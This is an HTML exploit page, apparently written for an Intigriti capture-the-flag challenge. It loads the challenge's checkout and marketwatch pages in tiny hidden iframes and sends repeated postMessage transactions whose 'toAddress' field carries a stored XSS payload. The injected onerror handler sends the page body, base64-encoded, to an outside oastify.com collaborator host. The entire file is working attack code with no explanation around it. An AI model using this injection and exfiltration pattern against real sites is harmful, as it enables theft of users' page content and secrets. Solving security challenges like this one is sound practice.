<!DOCTYPE html>
<html>
<head><title>Follow the Trail</title></head>
<body style="background:#050A0E;color:#00FF88;font-family:monospace;text-align:center;">
    <h1>TRANSFERRING 1337COIN...</h1>
    
    <iframe id="checkout" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" width="1" height="1"></iframe>
    
    <iframe id="trigger" src="https://challenge-0126.intigriti.io/marketwatch.html" width="1" height="1"></iframe>

    <script>
        const COLLAB = 'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com';
        
        // The Payload: Breaks out of the title attribute.
        // It tries to grab the flag from the banner OR the cookies.
        const XSS = `"><img src=x onerror="fetch('${COLLAB}/?flag='+btoa(document.body.innerHTML))">`;

        window.onload = function() {
            const checkoutFrame = document.getElementById('checkout').contentWindow;

            // Step 1: Spam the transaction to checkout.html
            let count = 0;
            const spammer = setInterval(() => {
                checkoutFrame.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        currency: '1337COIN',
                        amount: 0.0001,
                        toAddress: XSS 
                    }
                }, '*');
                count++;
                if (count > 20) clearInterval(spammer);
            }, 500);

            // Step 2: Refresh the MarketWatch iframe to see the new "trail" (the XSS)
            setTimeout(() => {
                document.getElementById('trigger').src = "https://challenge-0126.intigriti.io/marketwatch.html";
            }, 6000);
        };
    </script>
</body>
</html>
